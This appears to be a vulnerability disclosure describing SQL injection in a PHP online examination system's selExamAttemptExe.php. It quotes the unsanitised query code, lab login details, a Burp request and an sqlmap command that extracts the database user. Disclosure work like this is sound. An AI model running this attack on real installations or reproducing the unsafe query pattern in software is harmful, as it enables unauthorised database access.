## Online Examination System With Timer

## SQL Injection on `/query/selExamAttemptExe.php`

### Vendor Homepage:

```
https://www.campcodes.com/projects/php/online-examination-system-with-timer/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://192.168.150.131/index.php
glenn@gmail.com
glenn
```

### Affected Page:

```
/query/selExamAttemptExe.php
```

The potential injection point is located in `selExamAttemptExe.php`. This file directly utilizes the `$thisId`  variables to construct a database query without employing parameterized queries or proper data sanitization measures.

```php
# /query/selExamAttemptExe.php
extract($_POST);
$selExamAttmpt = $conn->query("SELECT * FROM exam_attempt WHERE exmne_id='$exmneId' AND exam_id='$thisId' ");
if($selExamAttmpt->rowCount() > 0)
{
	$res = array("res" => "alreadyExam", "msg" => $thisId);
}
else
{
	$res = array("res" => "takeNow");
}
echo json_encode($res);
```

### Proof of Concept:

**Burp Request:**

```
POST /query/selExamAttemptExe.php HTTP/1.1
Host: 192.168.150.131
Content-Length: 42
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.150.131
Referer: http://192.168.150.131/home.php?page=exam&id=13
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=a3630ea0258c281edaea4e92c6a98410
x-forwarded-for: 8.8.8.8
Connection: close

thisId=1
```

```
python sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

**Screenshot:**

![image-20240513164421313](./screenshot/image-20240513164421313.png)
